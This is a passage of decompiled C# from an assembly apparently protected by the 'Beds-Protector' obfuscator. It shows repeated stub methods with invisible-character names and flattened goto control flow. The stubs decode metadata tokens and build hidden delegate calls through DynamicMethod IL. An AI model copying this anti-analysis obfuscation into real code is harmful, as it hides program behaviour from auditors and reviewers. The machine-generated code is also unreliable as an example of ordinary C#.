        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoggBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoggBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 99938 - 57185 - 42748;
      }
      if (num1 == 7492 + 19192 - 26676)
      {
        if (method.IsStatic)
          num1 = 44610 + 27169 - 71770;
        else
          goto label_45;
      }
      if (num1 != 97690 - 142173 + 44507)
        goto label_27;
label_25:
      if (index1 >= parameterTypes.Length)
        num1 = 45799 + 39298 - 85072;
      else
        goto label_16;
label_27:
      if (num1 == 49496 - 84551 + 35069)
      {
        index2 = 0;
        num1 = 79366 - 18063 - 61288;
      }
      if (num1 == 67151 - 157455 + 90313)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 72728 - 49052 - 23666;
      }
      if (num1 == 68807 + 13424 - 82230)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 86143 - 158946 + 72805;
      }
      if (num1 == 72597 - 164215 + 91625)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 34590 - 105014 + 70432;
      }
      if (num1 == 53422 + 35056 - 88476)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 4979 - 83685 + 78709;
      }
      if (num1 == 35864 - 82619 + 46758)
      {
        num2 = numArray.Length;
        num1 = 72711 - 141371 + 68664;
      }
      if (num1 == 9134 - 74868 + 65753)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 10230 + 55338 - 65548;
      }
      if (num1 == 52434 - 33085 - 19332)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 14441 + 3009 - 17432;
        }
        else
        {
          ++index2;
          goto label_57;
        }
      }
      if (num1 != 89539 - 28336 - 61192)
        goto label_46;
label_45:
      dynamicMethod = (DynamicMethod) null;
      num1 = 71702 - 79294 + 7604;
label_46:
      if (num1 == 93446 - 6525 - 86896)
      {
        declaringType = method.DeclaringType;
        num1 = 34346 + 64636 - 98956;
      }
      if (num1 == 72811 - 89366 + 16578)
      {
        ++index1;
        num1 = 34436 + 11604 - 46016;
      }
      if (num1 != 76908 - 15793 - 61100)
      {
        if (num1 == 54775 + 7051 - 61826)
          num1 = 26076 - 59522 + 33447;
        continue;
      }
label_57:
      if (index2 < methods.Length)
        goto label_18;
      else
        goto label_58;
    }
    while (num1 != 51100 - 24645 - 26429);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[3] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoggBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoggBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogGBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogGBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 71043 - 27644 - 43399;
    FieldInfo fieldFromHandle;
    Type fieldType;
    MethodBase method;
    Type declaringType;
    MethodInfo methodInfo;
    Type[] parameterTypes;
    DynamicMethod dynamicMethod;
    do
    {
      int index1;
      int index2;
      ParameterInfo[] parameters;
      MethodInfo[] methods;
      if (num1 != 17516 - 25485 + 7990)
      {
        int metadataToken;
        if (num1 == 81767 - 63781 - 17981)
        {
          metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
          num1 = 66796 - 137404 + 70614;
        }
        if (num1 == 48970 - 39364 - 9599)
        {
          fieldType = fieldFromHandle.FieldType;
          num1 = 73316 - 277 - 73031;
        }
        if (num1 == 56332 - 90844 + 34537)
        {
          declaringType = method.DeclaringType;
          num1 = 30717 - 80132 + 49441;
        }
        if (num1 == 45778 - 78507 + 32749)
        {
          index1 = 0;
          num1 = 53448 - 41164 - 12263;
        }
        byte[] numArray;
        int num2;
        if (num1 == 72527 - 25791 - 46733)
        {
          num2 = numArray.Length;
          num1 = 73179 - 145876 + 72701;
        }
        if (num1 == 23436 + 38026 - 61448)
        {
          index2 = 0;
          num1 = 14547 + 17979 - 32511;
        }
        if (num1 == 22239 + 12494 - 34731)
        {
          numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
          num1 = 91211 - 132534 + 41326;
        }
        if (num1 == 23847 - 29769 + 5945)
        {
          ++index1;
          num1 = 53398 - 13908 - 39466;
        }
        if (num1 == 8861 - 108354 + 99511)
        {
          parameters = methodInfo.GetParameters();
          num1 = 58548 - 70423 + 11894;
        }
        if (num1 == 20608 + 10371 - 30960)
        {
          parameterTypes = new Type[parameters.Length];
          num1 = 5717 - 86455 + 80758;
        }
        if (num1 != 23881 - 70611 + 46741)
          goto label_24;
label_23:
        dynamicMethod = (DynamicMethod) null;
        num1 = 51462 + 36898 - 88348;
label_24:
        if (num1 == 32592 + 11583 - 44174)
        {
          fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
          num1 = 22371 + 2026 - 24395;
        }
        if (num1 == 14709 - 104960 + 90264)
        {
          methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
          num1 = 91423 - 55657 - 35752;
        }
        if (num1 == 80750 + 6317 - 87057)
          return;
        if (num1 == 73190 - 117563 + 44377)
        {
          int num3;
          int num4;
          int num5;
          int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[0] ^ (int) numArray[num3 = num2 - 1]) << 16) + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num5 = num4 - 1]) << 24);
          int num7 = num5 - 1;
          int num8 = ((int) fieldFromHandle.Name[3] ^ (int) numArray[num2 = num7 - 1]) << 0;
          metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoghBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoghBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
          num1 = 49553 - 46068 - 3480;
        }
        if (num1 == 44441 + 1550 - 45985)
        {
          method = fieldFromHandle.Module.ResolveMethod(metadataToken);
          num1 = 53973 - 55281 + 1315;
        }
        if (num1 != 94584 - 137063 + 42494)
        {
          if (num1 == 95291 - 26707 - 68576)
          {
            if (method.IsStatic)
              num1 = 75115 - 36297 - 38809;
            else
              goto label_23;
          }
          if (num1 == 77100 + 21629 - 98717)
          {
            parameterTypes = (Type[]) null;
            num1 = 95208 - 170336 + 75141;
          }
          if (num1 == 93701 - 82219 - 11473)
          {
            fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
            num1 = 39452 - 95253 + 55811;
          }
          if (num1 != 43970 - 74700 + 30746)
            goto label_43;
        }
        else
          goto label_57;
      }
      else
        goto label_46;
label_42:
      methodInfo = methods[index2];
      num1 = 40694 - 29232 - 11445;
label_43:
      if (num1 != 78410 - 165624 + 87236)
        goto label_45;
label_44:
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 88949 - 131577 + 42651;
label_45:
      if (num1 != 93258 - 170547 + 77313)
        goto label_48;
label_46:
      if (index1 >= parameterTypes.Length)
        num1 = 46808 + 10699 - 57482;
      else
        goto label_44;
label_48:
      if (num1 == 38712 - 74334 + 35639)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 83109 + 5567 - 88658;
        }
        else
        {
          ++index2;
          goto label_57;
        }
      }
      if (num1 == 2615 + 4762 - 7377)
        num1 = 70844 - 121558 + 50715;
      continue;
label_57:
      if (index2 < methods.Length)
        goto label_42;
      else
        goto label_58;
    }
    while (num1 != 89841 - 113056 + 23241);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[2] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoghBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoghBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogHBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogHBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 86682 - 166467 + 79785;
    Type[] parameterTypes;
    MethodInfo methodInfo;
    DynamicMethod dynamicMethod;
    FieldInfo fieldFromHandle;
    Type fieldType;
    MethodBase method;
    Type declaringType;
    do
    {
      if (num1 == 45611 - 51958 + 6359)
      {
        parameterTypes = (Type[]) null;
        num1 = 57130 - 140219 + 83102;
      }
      ParameterInfo[] parameters;
      if (num1 == 51572 - 29445 - 22109)
      {
        parameters = methodInfo.GetParameters();
        num1 = 56065 - 45367 - 10679;
      }
      if (num1 != 97827 - 102455 + 4639)
        goto label_7;
label_6:
      dynamicMethod = (DynamicMethod) null;
      num1 = 11654 + 53991 - 65633;
label_7:
      if (num1 == 13942 + 20172 - 34105)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 52056 + 42087 - 94133;
      }
      if (num1 == 4068 - 3603 - 464)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 36521 - 78225 + 41706;
      }
      byte[] numArray;
      if (num1 == 19410 - 4314 - 15094)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 97528 - 154903 + 57378;
      }
      if (num1 != 51122 - 52467 + 1369)
        goto label_16;
label_14:
      int index1;
      if (index1 >= parameterTypes.Length)
        num1 = 52536 - 147754 + 95243;
      else
        goto label_44;
label_16:
      int num2;
      if (num1 == 66549 - 62154 - 4392)
      {
        num2 = numArray.Length;
        num1 = 96698 - 173964 + 77270;
      }
      int metadataToken;
      if (num1 == 8320 + 46076 - 54392)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num4 = num3 - 1]) << 24) + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num5 = num4 - 1]) << 16);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[1] ^ (int) numArray[num2 = num7 - 1]) << 8;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogiBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogiBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 57607 - 92825 + 35223;
      }
      if (num1 == 45679 - 27009 - 18664)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 12225 - 101356 + 89138;
      }
      if (num1 == 82638 - 49059 - 33572)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 14978 + 80403 - 95373;
      }
      if (num1 == 95585 - 77648 - 17914)
      {
        ++index1;
        num1 = 47260 - 28079 - 19157;
      }
      if (num1 == 64264 - 148653 + 84408)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 38862 - 126077 + 87235;
      }
      int index2;
      if (num1 == 89741 - 55175 - 34549)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 23193 - 86432 + 63257;
        }
        else
        {
          ++index2;
          goto label_57;
        }
      }
      if (num1 == 87314 - 127370 + 40066)
        return;
      if (num1 != 38714 - 10177 - 28521)
        goto label_34;
label_33:
      MethodInfo[] methods;
      methodInfo = methods[index2];
      num1 = 12230 - 51156 + 38943;
label_34:
      if (num1 == 61670 - 73690 + 12040)
      {
        index1 = 0;
        num1 = 63721 + 9018 - 72718;
      }
      if (num1 == 59356 - 92332 + 32981)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 35235 - 134102 + 98873;
      }
      if (num1 != 50815 - 22808 - 27986)
      {
        if (num1 == 54588 - 79169 + 24606)
        {
          declaringType = method.DeclaringType;
          num1 = 70315 - 145142 + 74853;
        }
        if (num1 == 55307 - 6844 - 48449)
        {
          index2 = 0;
          num1 = 7635 + 56351 - 63971;
        }
        if (num1 != 90635 - 188349 + 97736)
          goto label_45;
      }
      else
        goto label_14;
label_44:
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 45464 - 134833 + 89392;
label_45:
      if (num1 != 75195 - 81437 + 6257)
      {
        if (num1 == 30275 - 98725 + 68458)
        {
          if (method.IsStatic)
            num1 = 3848 + 41192 - 45031;
          else
            goto label_6;
        }
        if (num1 == 33576 - 17150 - 16413)
        {
          methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
          num1 = 82830 - 93270 + 10454;
        }
        if (num1 == 14337 - 107393 + 93056)
          num1 = 37187 - 122584 + 85398;
        continue;
      }
label_57:
      if (index2 < methods.Length)
        goto label_33;
      else
        goto label_58;
    }
    while (num1 != 66027 + 24268 - 90269);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[0] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogiBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogiBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogIBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogIBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 69010 - 27701 - 41309;
    Type[] parameterTypes;
    FieldInfo fieldFromHandle;
    Type fieldType;
    MethodBase method;
    Type declaringType;
    MethodInfo methodInfo;
    DynamicMethod dynamicMethod;
    do
    {
      int index1;
      byte[] numArray;
      int num2;
      int metadataToken;
      ParameterInfo[] parameters;
      int index2;
      MethodInfo[] methods;
      if (num1 != 28504 + 1136 - 29625)
      {
        if (num1 != 39432 - 135015 + 95607)
          goto label_5;
label_3:
        if (index1 >= parameterTypes.Length)
          num1 = 8057 + 32977 - 41009;
        else
          goto label_15;
label_5:
        if (num1 == 80274 + 6394 - 86659)
        {
          fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
          num1 = 3417 - 2147 - 1260;
        }
        if (num1 != 46855 + 47557 - 94391)
        {
          if (num1 == 96335 - 69300 - 27010)
          {
            declaringType = method.DeclaringType;
            num1 = 39999 + 20859 - 60832;
          }
          if (num1 == 1359 - 8834 + 7479)
          {
            int num3;
            int num4;
            int num5;
            int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[0] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num4 = num3 - 1]) << 16) + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num5 = num4 - 1]) << 24);
            int num7 = num5 - 1;
            int num8 = ((int) fieldFromHandle.Name[1] ^ (int) numArray[num2 = num7 - 1]) << 8;
            metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogjBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogjBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
            num1 = 27149 - 3441 - 23703;
          }
          if (num1 == 15406 - 66455 + 51051)
          {
            numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
            num1 = 74651 - 9764 - 64884;
          }
          if (num1 != 14846 - 66139 + 51315)
            goto label_16;
        }
        else
          goto label_3;
label_15:
        parameterTypes[index1] = parameters[index1].ParameterType;
        num1 = 52047 - 12427 - 39597;
label_16:
        if (num1 == 98738 - 18490 - 80228)
        {
          index1 = 0;
          num1 = 89008 - 52193 - 36794;
        }
        if (num1 == 27315 + 46918 - 74223)
          return;
        if (num1 == 40459 + 14750 - 55195)
        {
          index2 = 0;
          num1 = 44015 + 34774 - 78774;
        }
        if (num1 == 33530 - 107575 + 74058)
        {
          methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
          num1 = 62955 - 90734 + 27793;
        }
        if (num1 == 50209 - 114596 + 64406)
        {
          parameterTypes = new Type[parameters.Length];
          num1 = 29507 - 79254 + 49767;
        }
        if (num1 == 34520 - 27300 - 7215)
        {
          metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
          num1 = 87413 - 70696 - 16711;
        }
        if (num1 != 80604 - 40777 - 39811)
          goto label_29;
      }
      else
        goto label_57;
label_28:
      methodInfo = methods[index2];
      num1 = 70685 - 96869 + 26201;
label_29:
      if (num1 == 49480 - 102199 + 52722)
      {
        num2 = numArray.Length;
        num1 = 32826 - 57647 + 24825;
      }
      if (num1 == 9688 - 59417 + 49741)
      {
        parameterTypes = (Type[]) null;
        num1 = 72541 - 20982 - 51546;
      }
      if (num1 == 65538 - 32698 - 32839)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 52434 - 3885 - 48547;
      }
      if (num1 == 72387 - 30951 - 41418)
      {
        parameters = methodInfo.GetParameters();
        num1 = 73533 + 24456 - 97970;
      }
      if (num1 == 85449 + 11009 - 96452)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 38483 - 57743 + 19267;
      }
      if (num1 == 38962 - 137968 + 99014)
      {
        if (method.IsStatic)
          num1 = 47857 - 31454 - 16394;
        else
          goto label_48;
      }
      if (num1 == 75071 - 62044 - 13004)
      {
        ++index1;
        num1 = 52806 + 39581 - 92363;
      }
      if (num1 == 25 - 25779 + 25771)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 30688 + 55668 - 86338;
        }
        else
        {
          ++index2;
          goto label_57;
        }
      }
      if (num1 != 83872 - 10311 - 73550)
        goto label_49;
label_48:
      dynamicMethod = (DynamicMethod) null;
      num1 = 91264 - 154072 + 62820;
label_49:
      if (num1 == 84783 - 22427 - 62349)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 54751 - 22179 - 32564;
      }
      if (num1 == 28373 - 54275 + 25902)
        num1 = 25199 + 30473 - 55671;
      continue;
label_57:
      if (index2 < methods.Length)
        goto label_28;
      else
        goto label_58;
    }
    while (num1 != 52532 - 30199 - 22307);
